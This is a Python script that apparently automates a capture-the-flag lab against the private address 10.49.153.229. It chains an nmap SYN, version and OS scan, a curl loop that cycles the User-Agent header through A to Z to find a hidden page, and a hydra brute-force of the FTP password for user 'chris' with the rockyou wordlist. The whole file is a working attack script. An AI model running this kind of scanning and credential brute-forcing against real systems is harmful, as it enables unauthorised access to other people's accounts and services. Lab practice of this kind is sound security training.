import requests
import subprocess
import string
import re

def curlBrute(url):

    print(f"Curl to the website : {url}")

    previousResponse=""

    for letters in string.ascii_uppercase:
        print(f"The Letter is : {letters}")
        
        cmd=["curl",f"{url}","-H",f"User-Agent:{letters}","-L"]

        result=subprocess.run(cmd,capture_output=True,text=True)

        if(result.returncode!=0):
            return RuntimeError(result.stderr)

        output=result.stdout
        
        if(len(output) != len(previousResponse) and previousResponse!=""):
            return output
        else:
            previousResponse=output
    print("Not Found in A-Z")


def nmapScan(ip):
    print(f"\n\nPerforming nmap Scan to the IP : {ip}\n")

    cmd=["sudo","nmap","-sS","-sV","-sC","-T4","-O","-v",f"{ip}"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    nmap_output=result.stdout

    open_ports = re.findall(r"^(\d+)/[a-zA-Z]+\s+open", nmap_output, re.MULTILINE)

    return open_ports


def hydraPassGen(ip):
    #hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.49.153.229

    print(f"\n\nPerforming hydra Brute Force for FTP user : {ip}\n")

    cmd=["hydra","-l","chris","-P","/usr/share/wordlists/rockyou.txt",f"ftp://{ip}"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    hydra_output=result.stdout
    
    match = re.search(r"password:\s+(\S+)", hydra_output)

    if match:
        password = match.group(1)
        return password
    else:
        print("No password found in the output.")


def main():
    ip="10.49.153.229"
    open_ports = nmapScan(ip)
    for el in open_ports:
        print(f"open Ports are : {el}")
    print(curlBrute(f"http://{ip}"))
    print(f"For Username chris , Password is : {hydraPassGen(ip)}")


main()


    
